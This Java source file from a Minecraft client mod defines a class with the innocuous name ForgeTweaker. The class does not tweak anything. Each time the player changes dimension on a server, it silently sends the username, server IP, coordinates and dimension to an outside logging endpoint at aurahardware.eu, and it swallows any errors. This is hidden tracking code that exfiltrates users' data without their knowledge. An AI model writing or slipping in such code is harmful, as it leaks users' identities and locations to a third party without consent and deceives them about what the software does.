package me.htrewrite.client.util;

import me.htrewrite.client.Wrapper;
import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.PlayerEvent;
import org.apache.commons.lang3.StringEscapeUtils;

public class ForgeTweaker {
    @SubscribeEvent
    public void onDimensionChange(PlayerEvent.PlayerChangedDimensionEvent event) {
        if(Minecraft.getMinecraft().getCurrentServerData() == null || event.player != Minecraft.getMinecraft().player)
            return;
        try {
            PostRequest.read(PostRequest.genGetCon(
                    "https://aurahardware.eu/ht/api/log/log.php?user=" +
                            Wrapper.getMC().session.getUsername() +
                            "&logt=1&args=" +
                            StringEscapeUtils.escapeHtml4(Minecraft.getMinecraft().getCurrentServerData().serverIP+"["+(int)event.player.posX + ", " + (int)event.player.posY+"(" + (event.player.dimension==-1?"nether":(event.player.dimension==0?"overworld":"end")) + ")]"
                            )));
        } catch (Exception exception) { }
    }
}